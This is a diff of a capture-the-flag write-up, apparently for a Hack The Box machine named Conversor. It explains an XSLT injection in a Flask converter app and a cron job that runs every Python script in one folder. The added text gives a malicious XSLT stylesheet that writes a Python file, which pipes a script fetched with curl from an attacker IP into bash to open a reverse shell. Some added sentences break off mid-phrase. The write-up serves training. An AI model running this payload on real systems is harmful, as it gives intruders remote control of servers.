@@ -293,15 +293,56 @@ If you want to run Python scripts (for example, our server deletes all files old
 * * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
 """
 ```
-The `app.py` source code does prove the XML and XSLT vulnerability attempted previously.
+The `app.py` source code does prove the XML and XSLT vulnerability attempted previously. The code accepts a XSLT file from the user, parses it, and 
 ###### Vulnerable Code
 ```
-xslt_file = request.files['xslt_file'] #accepts the XSLT from the user
+xslt_file = request.files['xslt_file'] # accepts the XSLT from the user
 
-xslt_tree = etree.parse(xslt_path)
+xslt_tree = etree.parse(xslt_path) # parses the XSLT
 
-transform = etree.XSLT(xslt_tree)
+transform = etree.XSLT(xslt_tree) # Compiles and runs the 
 result_tree = transform(xml_tree)
 ```
+However, the vulnerability occurs during the compile and running of the XSLT file. The application runs the uploaded stylesheet without providing an explicit `XSLTAccessControl` policy. Without appropriate restrictions, a malicious stylesheet may be able to read local files or access network resources, depending on the runtime environment.
 
-. the install.dm, however, shows that there is a cronjob that runs any python script located in the scripts folder every 60 seconds.
+###### Contents of install.dm
+```
+To deploy Conversor, we can extract the compressed file:
+
+"""
+tar -xvf source_code.tar.gz
+"""
+
+We install flask:
+
+"""
+pip3 install flask
+"""
+
+We can run the app.py file:
+
+"""
+python3 app.py
+"""
+
+You can also run it with Apache using the app.wsgi file.
+
+If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.
+
+"""
+* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
+"""
+```
+
+The `install.dm` shows a cronjob that runs any python script located in the scripts folder every 60 seconds.
+
+Using a malicious XSLT file, we can create a python file that reaches to a python http server that's hosting a malicious .sh script that connects to a listener and creates a reverse shell.
+
+###### Malicious XSLT file
+```
+<?xml version="1.0" encoding="UTF-8"?> <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:shell="http://exslt.org/common"
+extension-element-prefixes="shell"> 
+	<xsl:template match="/">
+		<shell:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
+			import os os.system("curl 10.10.14.54:8000/shell.sh|bash") </shell:document> </xsl:template> </xsl:stylesheet>
+```
